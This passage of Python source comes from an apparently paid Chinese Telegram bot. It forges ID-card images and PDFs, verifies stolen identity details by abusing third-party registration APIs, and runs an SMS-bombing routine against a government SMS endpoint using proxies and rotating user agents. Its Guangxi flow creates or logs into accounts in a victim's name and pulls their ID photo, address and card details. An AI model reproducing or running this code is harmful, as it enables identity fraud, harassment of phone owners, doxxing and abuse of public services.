        address=context.user_data.get('auto_addr')
        if address:
            context.user_data['address']=address
            query.edit_message_text(f"✅ 已使用：{address}\n请发送照片")
            return PLC_PHOTO
        else:
            query.edit_message_text("未找到，请输入地址")
            return PLC_ADDR_MANUAL
    else:
        query.edit_message_text("请输入地址：")
        return PLC_ADDR_MANUAL

def plc_addr_manual(update,context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    addr=update.message.text.strip()
    if not addr:
        update.message.reply_text("地址不能为空")
        return PLC_ADDR_MANUAL
    context.user_data['address']=addr
    update.message.reply_text("请发送照片")
    return PLC_PHOTO

def plc_photo(update,context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    if not update.message.photo:
        update.message.reply_text("请发送图片")
        return PLC_PHOTO
    photo=update.message.photo[-1]
    file=photo.get_file()
    with tempfile.NamedTemporaryFile(suffix='.jpg',delete=False) as tmp:
        file.download(tmp.name)
        photo_path=tmp.name
    data=context.user_data
    if not all(k in data for k in ['name','id_number','address']):
        update.message.reply_text("信息不完整，重新 /plc")
        return ConversationHandler.END
    update.message.reply_text("⏳ 生成中...")
    try:
        img,pdf=generate_plc_sync(data['name'],data['id_number'],data['address'],photo_path)
        update.message.reply_photo(photo=img,caption=f"✅ {data['name']} 的PLC身份证")
        context.bot.send_document(chat_id=update.effective_chat.id, document=pdf, filename=f"{data['name']}_身份证_PLC.pdf")
    except FileNotFoundError as e:
        update.message.reply_text(f"❌ 文件缺失：{e}\n请确保 plc/ 目录下有 mb.jpg 和 10.ttf")
    except Exception as e:
        update.message.reply_text(f"❌ 失败: {e}")
    finally:
        if os.path.exists(photo_path):
            os.remove(photo_path)
        context.user_data.clear()
    return ConversationHandler.END

# ===== qf =====
def qf_start(update, context):
    context.user_data.clear()
    update.message.reply_text("请输入要查询的QQ号：")
    return QF_QQ

def qf_qq(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    if not update.message.text:
        update.message.reply_text("请发送文本消息")
        return QF_QQ
    qq = update.message.text.strip()
    if not qq.isdigit():
        update.message.reply_text("❌ 请输入纯数字QQ号：")
        return QF_QQ
    update.message.reply_text("⏳ 正在查询，请稍候...")
    try:
        result = query_protected(qq)
        msg = format_qf_result(result)
        update.message.reply_text(msg)
    except Exception as e:
        update.message.reply_text(f"❌ 查询出错: {e}")
    context.user_data.clear()
    return ConversationHandler.END

# ===== /2ys 二要素（扣费1积分） =====
def ys_start(update, context):
    context.user_data.clear()
    update.message.reply_text("请输入姓名：")
    return YS_NAME

def ys_name(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    name = update.message.text.strip()
    if not name:
        update.message.reply_text("姓名不能为空，请重新输入：")
        return YS_NAME
    context.user_data['ys_name'] = name
    update.message.reply_text("请输入18位身份证号：")
    return YS_ID

def ys_id(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    id_card = update.message.text.strip().upper()
    if len(id_card) != 18 or not (id_card[:17].isdigit() and id_card[-1] in '0123456789X'):
        update.message.reply_text("身份证号格式错误，请重新输入：")
        return YS_ID
    uid = update.effective_user.id
    ensure_user(uid)
    stats = get_user_stats(uid)
    cost = YS_COST
    if stats['points'] < cost:
        update.message.reply_text(f"❌ 积分不足，需要 {cost} 积分，当前 {stats['points']:.2f}")
        context.user_data.clear()
        return ConversationHandler.END
    users[str(uid)]['points'] = stats['points'] - cost
    save_users()
    update.message.reply_text(f"⏳ 正在校验（已扣除 {cost} 积分），请稍候...")
    name = context.user_data.get('ys_name')
    if not name:
        update.message.reply_text("姓名丢失，请重新 /2ys")
        context.user_data.clear()
        return ConversationHandler.END
    try:
        url = "https://www.bequicker.cn/apih5/product/applyCredit"
        headers = {
            "Host": "www.bequicker.cn",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; PFTM20 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/146.0.7680.178 Mobile Safari/537.36 XWEB/1460217 MMWEBSDK/20260502 MMWEBID/2034 REV/7e9754e50bfa30f9b448d54ced300fb52a4eefca MicroMessenger/8.0.74.3120(0x28004A7A) WeChat/arm64 Weixin NetType/4G Language/zh_CN ABI/arm64",
            "sec-ch-ua": "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Android WebView\";v=\"146\"",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "Accept": "*/*",
            "Origin": "https://cms.bequicker.cn",
            "X-Requested-With": "com.tencent.mm",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://cms.bequicker.cn/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        payload = {
            "type": 1,
            "tgw_id": "JN2ZBL",
            "name": name,
            "mobile": "14769265303",
            "code": "",
            "id_card": id_card,
            "id": "47"
        }
        resp = requests.post(url, headers=headers, json=payload, timeout=20)
        result = resp.json()
        if result.get("code") == 1 and result.get("msg") == "申请成功":
            update.message.reply_text(f"✅ {name} {id_card} 一致 🟢")
        elif result.get("code") == 0 and "验证失败" in result.get("msg", ""):
            update.message.reply_text(f"❌ {name} {id_card} 不一致 🔴")
        else:
            update.message.reply_text(f"服务器返回：\n{resp.text}")
    except Exception as e:
        update.message.reply_text(f"❌ 请求出错：{e}")
    context.user_data.clear()
    return ConversationHandler.END

# ===== /3ys 三要素核验（新增，1积分/次） =====
def three_start(update, context):
    context.user_data.clear()
    uid = update.effective_user.id
    ensure_user(uid)
    stats = get_user_stats(uid)
    if stats['points'] < THREE_COST:
        update.message.reply_text(f"❌ 积分不足，需要 {THREE_COST} 积分，当前 {stats['points']:.2f}")
        return ConversationHandler.END
    # 先扣除积分
    users[str(uid)]['points'] = stats['points'] - THREE_COST
    save_users()
    update.message.reply_text(f"✅ 已扣除 {THREE_COST} 积分，剩余 {users[str(uid)]['points']:.2f}\n请输入姓名：")
    return THREE_NAME

def three_name(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    name = update.message.text.strip()
    if not name:
        update.message.reply_text("姓名不能为空，请重新输入：")
        return THREE_NAME
    context.user_data['three_name'] = name
    update.message.reply_text("请输入手机号（11位）：")
    return THREE_PHONE

def three_phone(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    phone = update.message.text.strip()
    if not phone.isdigit() or len(phone) != 11:
        update.message.reply_text("手机号格式错误（需11位数字），请重新输入：")
        return THREE_PHONE
    context.user_data['three_phone'] = phone
    update.message.reply_text("请输入18位身份证号：")
    return THREE_ID

def three_id(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    id_card = update.message.text.strip().upper()
    if len(id_card) != 18 or not (id_card[:17].isdigit() and id_card[-1] in '0123456789X'):
        update.message.reply_text("身份证号格式错误，请重新输入：")
        return THREE_ID

    # 收集所有信息
    name = context.user_data.get('three_name')
    phone = context.user_data.get('three_phone')
    if not name or not phone:
        update.message.reply_text("会话信息丢失，请重新 /3ys")
        context.user_data.clear()
        return ConversationHandler.END

    # 执行核验
    update.message.reply_text("⏳ 正在核验运营商三要素，请稍候...")
    result_msg = check_three_elements(name, phone, id_card)
    update.message.reply_text(result_msg)
    context.user_data.clear()
    return ConversationHandler.END

def check_three_elements(name, phone, id_card):
    """调用运营商三要素核验接口"""
    if not GMSSL_AVAILABLE:
        return "❌ 缺少 gmssl 库，无法加密，请先 pip install gmssl"
    try:
        sm2 = CryptSM2(public_key=PUBLIC_KEY, private_key="")
        sm2.mode = 1
        def encrypt(plain: str) -> str:
            return "04" + sm2.encrypt(plain.encode("utf-8")).hex()

        url = "https://app.btzwfw.cn/api/open-api/sso/app/oauth2/register"
        headers = {
            "Content-Type": "application/json",
            "platform": "mp-weixin",
            "cudt-app": "unicom",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 MicroMessenger/7.0.20.1781 MiniProgramEnv/Windows",
        }
        body = {
            "person": {
                "name": encrypt(name),
                "idName": encrypt(name),
                "idType": "111",
                "idCardNum": encrypt(id_card),
                "idPhone": encrypt(phone),
                "idPwd": encrypt("Abc@123456"),
                "confirmPwd": encrypt("Abc@123456"),
                "userSex": "M",
                "gender": "M",
                "effDate": "2023-01-01",
                "expDate": "2043-01-01",
                "msgId": "04843730249223a7adfc20ed56681bbf8e8c2baa1c83fadd849c27c741c0c8d230ef3d1a2f9052b85611db728f2465b24cbaed9a0cb0953bb5d103879f5617b0c76aff530b65f976acbd6e1bf43ddadc71a381e83b0dd0736317a6b01c03e9ef8a2fb2c08f1a832dbaddf3e9630378c5ec4b315c4b5011ad3aee2c0fdbe1fd9dfe",
                "smsCode": "04322e8f0ab6f5e71562c69625edf58557dbdce2d4bdb40e3389e2b1b05cc39f5de54d8f040ac7be1d3df860c27bf0fbfa7792c5f3a197dd89237942922c450424593cec0f8d9931fcca804dd7c5544f5eea3a54b4e0835b9fed13aee3c8f374376c7bd3f8f6ea",
                "source": "7",
            },
            "userType": "1",
        }
        resp = requests.post(url, json=body, headers=headers, timeout=30)
        data = resp.json()
        code = data.get("code")
        status = data.get("status")
        msg = data.get("message") or data.get("msg", "")

        if status == "success" and code != 500:
            return f"✅ {name} {phone} {id_card} 运营商三要素核验成功 {msg}"
        else:
            return f"❌ {name} {phone} {id_card} 运营商三要素核验失败 {msg}"
    except Exception as e:
        return f"❌ {name} {phone} {id_card} 核验出错：{str(e)}"

# ===== /sms 短信轰炸 =====
def do_sms_attack(chat_id, bot, target_count, phone, user_id):
    import random
    token_url = "https://ggzyjy.jxsggzy.cn/jxtoolws/rest/jxpWvCharService/getWvCharToken"
    sms_url = "https://ggzyjy.jxsggzy.cn/jxtoolws/rest/mobile/user/sendMessage"
    proxies = {}
    if os.environ.get('HTTP_PROXY'):
        proxies['http'] = os.environ.get('HTTP_PROXY')
    if os.environ.get('HTTPS_PROXY'):
        proxies['https'] = os.environ.get('HTTPS_PROXY')
    ua_list = [
        "Mozilla/5.0 (Linux; Android 14; RMX3920 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380353 MMWEBSDK/20240405 MMWEBID/8255 MicroMessenger/Lite Luggage/4.2.7 QQ/9.3.10.37675 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.180 Mobile Safari/537.36",
    ]
    session = requests.Session()
    session.headers.update({
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Referer": "https://servicewechat.com/wxeaf18610dab623b7/2/page-frame.html",
        "Host": "ggzyjy.jxsggzy.cn",
        "Origin": "https://ggzyjy.jxsggzy.cn",
        "User-Agent": random.choice(ua_list),
        "X-Requested-With": "XMLHttpRequest",
    })
    token_payload = {"appkey": "TPBidder"}
    count = 0; success_count = 0; fail_count = 0; error_reported = False
    try:
        while count < target_count:
            count += 1
            try:
                session.headers.update({"User-Agent": random.choice(ua_list)})
                token_res = session.post(token_url, json=token_payload, timeout=5, verify=False, proxies=proxies)
                if token_res.status_code != 200:
                    fail_count += 1
                    if not error_reported and count <= 3:
                        bot.send_message(chat_id, f"❌ Token获取失败，状态码{token_res.status_code}")
                        error_reported = True
                    time.sleep(1); continue
                data = token_res.json()
                if "custom" not in data or "token" not in data["custom"]:
                    fail_count += 1
                    if not error_reported and count <= 3:
                        bot.send_message(chat_id, f"❌ Token响应格式异常")
                        error_reported = True
                    time.sleep(1); continue
                token = data["custom"]["token"]
                sms_payload = {"token": token, "params": {"mobilephone": phone}}
                sms_res = session.post(sms_url, json=sms_payload, timeout=5, verify=False, proxies=proxies)
                if sms_res.status_code == 200:
                    sms_json = sms_res.json()
                    if sms_json.get('code') == 0:
                        success_count += 1
                    else:
                        fail_count += 1
                        if not error_reported and count <= 3:
                            bot.send_message(chat_id, f"❌ 短信失败：code={sms_json.get('code')}")
                            error_reported = True
                else:
                    fail_count += 1
                    if not error_reported and count <= 3:
                        bot.send_message(chat_id, f"❌ 短信接口HTTP {sms_res.status_code}")
                        error_reported = True
            except Exception as e:
                fail_count += 1
                if not error_reported and count <= 3:
                    bot.send_message(chat_id, f"❌ 异常：{e}")
                    error_reported = True
                time.sleep(1); continue
            time.sleep(1.0)
            if count % 10 == 0 or count == target_count:
                bot.send_message(chat_id, f"📤 进度：{count}/{target_count} 成功{success_count} 失败{fail_count}")
        bot.send_message(chat_id, f"✅ 刷短信完成！成功{success_count}条，失败{fail_count}条。")
    except Exception as e:
        bot.send_message(chat_id, f"❌ 刷短信过程中出错：{e}")

def sms_start(update, context):
    context.user_data.clear()
    keyboard = [
        [InlineKeyboardButton("100条", callback_data="sms_100"),
         InlineKeyboardButton("200条", callback_data="sms_200"),
         InlineKeyboardButton("300条", callback_data="sms_300")],
        [InlineKeyboardButton("400条", callback_data="sms_400"),
         InlineKeyboardButton("500条", callback_data="sms_500"),
         InlineKeyboardButton("1000条", callback_data="sms_1000")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text("请选择要发送的短信条数（每条消耗0.99积分）：", reply_markup=reply_markup)
    return SMS_CHOICE

def sms_choice_callback(update, context):
    query = update.callback_query
    query.answer()
    data = query.data
    if not data.startswith("sms_"):
        return
    count = int(data.split("_")[1])
    cost = round(count * 0.99, 2)
    user_id = query.from_user.id
    ensure_user(user_id)
    stats = get_user_stats(user_id)
    if stats['points'] < cost:
        query.edit_message_text(f"❌ 积分不足，需要 {cost:.2f} 积分，当前 {stats['points']:.2f}")
        return ConversationHandler.END
    users[str(user_id)]['points'] = stats['points'] - cost
    save_users()
    query.edit_message_text(f"✅ 已扣除 {cost:.2f} 积分，剩余 {users[str(user_id)]['points']:.2f} 积分。\n请输入手机号（11位）：")
    context.user_data['sms_count'] = count
    context.user_data['sms_cost'] = cost
    context.user_data['awaiting_phone'] = True
    return SMS_CHOICE

def sms_phone_input(update, context):
    if not context.user_data.get('awaiting_phone'):
        update.message.reply_text("请先使用 /sms 命令选择条数。")
        return ConversationHandler.END
    phone = update.message.text.strip()
    if not phone.isdigit() or len(phone) != 11:
        update.message.reply_text("❌ 手机号必须是11位数字，请重新输入：")
        return SMS_CHOICE
    count = context.user_data.get('sms_count')
    if not count:
        update.message.reply_text("❌ 会话超时，请重新 /sms")
        return ConversationHandler.END
    user_id = update.effective_user.id
    bot = context.bot
    chat_id = update.effective_chat.id
    threading.Thread(target=do_sms_attack, args=(chat_id, bot, count, phone, user_id), daemon=True).start()
    update.message.reply_text(f"🚀 开始刷短信，目标 {count} 条，请稍候... 进度会每10条通知一次。")
    context.user_data.clear()
    return ConversationHandler.END

def sms_cancel(update, context):
    context.user_data.clear()
    update.message.reply_text("已取消刷短信")
    return ConversationHandler.END

# ===== /gx 广西道路运输（原 /gxlys） =====
SM4_KEY = "CatsPK0WWWRRhjkw"
SboxTable = [
    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,
    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,
    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,
    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,
    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,
    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,
    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,
    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,
    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,
    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,
    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,
    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,
    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,
    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48
]
FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]
CK = [
    0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,
    0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,
    0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,
    0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,
    0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,
    0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,
    0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,
    0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279
]
def rotl(x, n):
    left = (x << n) & 0xffffffff
    signed_x = x - 0x100000000 if (x & 0x80000000) else x
    right = (signed_x >> (32 - n)) & 0xffffffff
    return left | right
def sm4_sbox(a):
    return (SboxTable[(a >> 24) & 0xFF] << 24) | \
           (SboxTable[(a >> 16) & 0xFF] << 16) | \
           (SboxTable[(a >> 8) & 0xFF] << 8) | \
           SboxTable[a & 0xFF]
def sm4_lt(ka):
    bb = sm4_sbox(ka)
    return bb ^ rotl(bb, 2) ^ rotl(bb, 10) ^ rotl(bb, 18) ^ rotl(bb, 24)
def sm4_calci_rk(ka):
    bb = sm4_sbox(ka)
    return bb ^ rotl(bb, 13) ^ rotl(bb, 23)
def sm4_f(x0, x1, x2, x3, rk):
    return x0 ^ sm4_lt(x1 ^ x2 ^ x3 ^ rk)
def pkcs7_pad(data: bytes, block_size=16) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len]) * pad_len
def sm4_encrypt_ecb(plain_text: str) -> str:
    data = plain_text.encode('utf-8')
    padded = pkcs7_pad(data, 16)
    key_bytes = SM4_KEY.encode('utf-8')
    mk = [0] * 4
    for i in range(4):
        mk[i] = (key_bytes[i*4] << 24) | (key_bytes[i*4+1] << 16) | (key_bytes[i*4+2] << 8) | key_bytes[i*4+3]
    k = [0] * 36
    for i in range(4):
        k[i] = mk[i] ^ FK[i]
    sk = [0] * 32
    for i in range(32):
        k[i+4] = k[i] ^ sm4_calci_rk(k[i+1] ^ k[i+2] ^ k[i+3] ^ CK[i])
        sk[i] = k[i+4]
    result = bytearray()
    for offset in range(0, len(padded), 16):
        block = padded[offset:offset+16]
        x = [0] * 36
        for i in range(4):
            x[i] = (block[i*4] << 24) | (block[i*4+1] << 16) | (block[i*4+2] << 8) | block[i*4+3]
        for i in range(32):
            x[i+4] = sm4_f(x[i], x[i+1], x[i+2], x[i+3], sk[i])
        out = bytearray(16)
        for i in range(4):
            val = x[35-i]
            out[i*4] = (val >> 24) & 0xFF
            out[i*4+1] = (val >> 16) & 0xFF
            out[i*4+2] = (val >> 8) & 0xFF
            out[i*4+3] = val & 0xFF
        result.extend(out)
    return base64.b64encode(result).decode('utf-8')

GX_BASE_URL = "http://www.gxdlys.com"
GX_PASSWORD = "268428."
GX_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive",
    "Referer": "http://www.gxdlys.com/Wechat/User/Regist",
}
def gx_get_captcha(session):
    try:
        url = GX_BASE_URL + "/Wechat/FaceDetect/GetVerifyCode"
        resp = session.get(url, headers=GX_HEADERS, timeout=10)
        if resp.status_code != 200:
            return None, None
        data = resp.json()
        if data.get("statusCode") != 200:
            return None, None
        img_b64 = data.get("data", {}).get("img")
        uuid = data.get("data", {}).get("uuid")
        if not img_b64 or not uuid:
            return None, None
        return img_b64, uuid
    except Exception as e:
        logger.error(f"获取图形验证码异常: {e}")
        return None, None
def gx_send_sms(session, phone, captcha_code, uuid):
    data = {
        "phoneId": phone,
        "type": "10001",
        "IsEncryptPhoneId": "false",
        "verifyCode": captcha_code,
        "uuid": uuid
    }
    try:
        r = session.post(GX_BASE_URL + "/System/SmsService/PostVerifyCode",
                         data=data,
                         headers={**GX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "http://www.gxdlys.com/Wechat/User/Regist"},
                         timeout=60)
        if r.status_code == 200:
            res = r.json()
            return res.get("statusCode") == 200, res.get("info", "未知错误")
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)
def gx_register(session, phone, sms_code, captcha_code, real_name, id_card):
    data = {
        "zipArea": "",
        "userType": "-1",
        "wechatUid": "",
        "realName": real_name,
        "iDCard": id_card,
        "loginName": id_card,
        "password": GX_PASSWORD,
        "idcardImg1Url": "218,8a785f252c8518",
        "idcardImg2Url": "216,8a7860c46589f3",
        "idcardImg3Url": "214,8a78664776227f",
        "idcardImg4Url": "",
        "ownerId": "",
        "tel": phone,
        "isTelEncrypted": "false",
        "validCode": sms_code,
        "verifyCode": captcha_code
    }
    try:
        r = session.post(GX_BASE_URL + "/Wechat/User/RegistAdd",
                         data=data,
                         headers={**GX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "http://www.gxdlys.com/Wechat/User/Regist"},
                         timeout=60)
        if r.status_code == 200:
            res = r.json()
            return res.get("statusCode") == 200, res.get("info", "未知错误")
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)
def gx_login(session, id_card, password):
    encrypted_login_raw = sm4_encrypt_ecb(id_card)
    encrypted_pwd_raw = sm4_encrypt_ecb(password)
    encrypted_login = urllib.parse.quote(encrypted_login_raw)
    encrypted_pwd = urllib.parse.quote(encrypted_pwd_raw)
    data = f"loginName={encrypted_login}&password={encrypted_pwd}&wechatUid="
    login_headers = {**GX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "http://www.gxdlys.com/Wechat/Home/Login", "Host": "www.gxdlys.com"}
    try:
        response = session.post("http://www.gxdlys.com/Wechat/Home/PostLogin", headers=login_headers, data=data, timeout=60)
        if response.status_code == 200:
            res = response.json()
            status = res.get("statusCode")
            info = res.get("info", "")
            if status == 200:
                return True, "登录成功"
            else:
                return False, info
        return False, f"HTTP {response.status_code}"
    except Exception as e:
        return False, str(e)
def gx_query_photo(session, name, id_card):
    try:
        encoded_name = urllib.parse.quote(name)
        url = f"{GX_BASE_URL}/Wechat/FaceDetect/GetGAIDCardPhotoNew?idCard={id_card}&name={encoded_name}"
        query_headers = {**GX_HEADERS, "Referer": "http://www.gxdlys.com/Wechat/EcertCert/ECertApply?OperateType=0&BnsAcceptId=&ObjectId=&BasicBnsId=46011&Params=%E7%BB%8F%E8%90%A5%E6%80%A7%E9%81%93%E8%B7%AF%E8%B4%A7%E7%89%A9%E8%BF%90%E8%BE%93%E9%A9%BE%E9%A9%B6%E5%91%98&Step=1", "Host": "www.gxdlys.com"}
        response = session.get(url, headers=query_headers, timeout=60)
        if response.status_code != 200:
            return False, f"HTTP {response.status_code}"
        result = response.json()
        if result.get("statusCode") == 200:
            return True, result.get("data", {})
        else:
            return False, result.get("info", "未知错误")
    except Exception as e:
        return False, str(e)
def gx_download_photo(session, file_id):
    try:
        url = f"{GX_BASE_URL}/System/FileService/ShowFile?fileId={file_id}"
        response = session.get(url, timeout=60)
        if response.status_code == 200 and 'image' in response.headers.get('Content-Type', ''):
            return response.content
        return None
    except Exception as e:
        logger.error(f"下载照片异常: {e}")
        return None
def gx_format_info(item2):
    xm = item2.get("xm", "").strip()
    sfz = item2.get("gmsfhm", "").strip()
    mz = item2.get("mz", "").replace("族", "").strip()
    qfjg = item2.get("issueD_UNIT", "").strip()
    zz = item2.get("fulladdr", "").strip()
    yxqq = item2.get("uL_FROM_DATE", "").replace("-", ".")
    yxqz = item2.get("uL_END_DATE", "").replace("-", ".")
    return f"姓名：{xm}\n身份证：{sfz}\n民族：{mz}\n有效期：{yxqq} 至 {yxqz}\n签发机关：{qfjg}\n地址：{zz}"

# ---------- 广西入口（已扣费） ----------
def gx_start(update, context):
    context.user_data.clear()
    uid = update.effective_user.id
    ok, msg = deduct_points(uid, GX_COST, "（广西查询）")
    if not ok:
        update.message.reply_text(f"❌ {msg}，当前积分: {get_user_stats(uid)['points']:.2f}")
        return
    update.message.reply_text(f"✅ 已扣除 {GX_COST} 积分，开始广西查询流程。\n请输入姓名：")
    return GX_NAME

def gx_name(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    name = update.message.text.strip()
    if not name:
        update.message.reply_text("姓名不能为空，请重新输入：")
        return GX_NAME
    context.user_data['gx_name'] = name
    update.message.reply_text("请输入18位身份证号：")
    return GX_ID

def gx_id(update, context):
    if update.message.text and update.message.text.startswith('/'):
        context.user_data.clear()
        update.message.reply_text("⏹️ 已取消")
        return ConversationHandler.END
    id_card = update.message.text.strip().upper()
    if len(id_card) != 18 or not (id_card[:17].isdigit() and id_card[-1] in '0123456789X'):
        update.message.reply_text("格式错误，请重新输入：")
        return GX_ID
    context.user_data['gx_id'] = id_card

    session = requests.Session()
    working_proxy = None
    if os.environ.get('HTTP_PROXY'):
        working_proxy = os.environ.get('HTTP_PROXY')
        logger.info(f"使用环境变量代理: {working_proxy}")
        session.proxies = {'http': working_proxy, 'https': working_proxy}
    else:
        working_proxy = load_working_proxy(max_tests=3, timeout_total=10)
        if working_proxy:
            session.proxies = {'http': f'http://{working_proxy}', 'https': f'http://{working_proxy}'}
        else:
            logger.warning("未启用代理，将直连")
    session.get(GX_BASE_URL, headers=GX_HEADERS, timeout=10)
    context.user_data['gx_session'] = session

    update.message.reply_text("⏳ 正在检查账号状态...")
    ok, msg = gx_login(session, id_card, GX_PASSWORD)
    if ok:
        update.message.reply_text("✅ 登录成功，正在获取信息...")
        success, data = gx_query_photo(session, context.user_data['gx_name'], id_card)
        if success:
            item2 = data.get("item2", {})
            if item2:
                update.message.reply_text(gx_format_info(item2))
            else:
                update.message.reply_text("⚠️ 未获取到身份文字信息")
            file_id = data.get("item1")
            if file_id:
                img_data = gx_download_photo(session, file_id)
                if img_data:
                    update.message.reply_photo(photo=io.BytesIO(img_data), caption="身份证照片")
                else:
                    update.message.reply_text("⚠️ 照片下载失败")
        else:
            update.message.reply_text(f"❌ 查询失败：{data}")
        context.user_data.clear()
        return ConversationHandler.END
    else:
        if "未注册" in msg or "不存在" in msg:
            update.message.reply_text(f"⚠️ 检测到未注册：{msg}\n请输入手机号（用于注册）：")
            return GX_PHONE
        else:
            update.message.reply_text(f"❌ 登录失败：{msg}\n可能密码错误或账号异常，流程终止。")
            context.user_data.clear()
